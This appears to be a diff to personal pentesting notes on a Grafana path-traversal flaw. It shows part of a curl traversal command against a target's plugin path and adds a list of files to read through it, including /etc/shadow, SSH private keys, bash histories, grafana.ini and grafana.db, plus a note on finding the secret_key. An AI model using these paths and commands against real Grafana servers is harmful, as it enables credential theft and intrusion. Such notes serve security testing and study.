@@ -19,6 +19,27 @@ const command = `curl --path-as-is http://${ip}:3000/public/plugins/alertlist/..
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+#### (Extra) Interesting folder/file for LFI
+- /conf/defaults.ini
+- /etc/grafana/grafana.ini
+- /etc/passwd
+- /etc/shadow
+- /home/grafana/.bash_history
+- /home/grafana/.ssh/id_rsa
+- /root/.bash_history
+- /root/.ssh/id_rsa
+- /usr/local/etc/grafana/grafana.ini
+- /var/lib/grafana/grafana.db
+- /proc/net/fib_trie
+- /proc/net/tcp
+- /proc/self/cmdline
+these are directories, FUZZING them can help discover plugins)
+
+- /usr/share/grafana/public/app/plugins/datasource
+- /usr/share/grafana/public/app/plugins/
+
+#### Secret Key
+
 /etc/grafana/grafana.ini should contain the Secret key we need
 
 Ctrl + Shift + F secret_key
